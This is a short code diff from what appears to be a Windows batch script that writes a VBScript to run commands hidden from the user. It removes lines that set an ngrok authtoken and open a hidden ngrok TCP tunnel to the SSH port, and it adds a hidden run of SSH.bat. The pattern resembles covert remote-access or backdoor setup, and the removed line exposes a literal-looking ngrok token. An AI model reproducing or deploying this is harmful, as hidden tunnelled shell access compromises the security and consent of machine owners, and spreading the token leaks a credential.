@@ -94,9 +94,8 @@ echo Set fso = CreateObject("Scripting.FileSystemObject")>>run2.vbs
 
 echo usrName = objWShell.expandEnvironmentStrings("%USERNAME%")>>run2.vbs
 
-echo objShell.Run "ngrok config add-authtoken 7zFPzj3u8MAQjqyJsMKWx_5otRYcmDfdQfq1PRTcSTe", vbhide >>run2.vbs
+echo objShell.Run "SSH.bat", vbhide >>run2.vbs
 
-echo objShell.Run "C:\temp\ngrok tcp 22", vbhide -force >>run2.vbs
 
 timeout 2
 
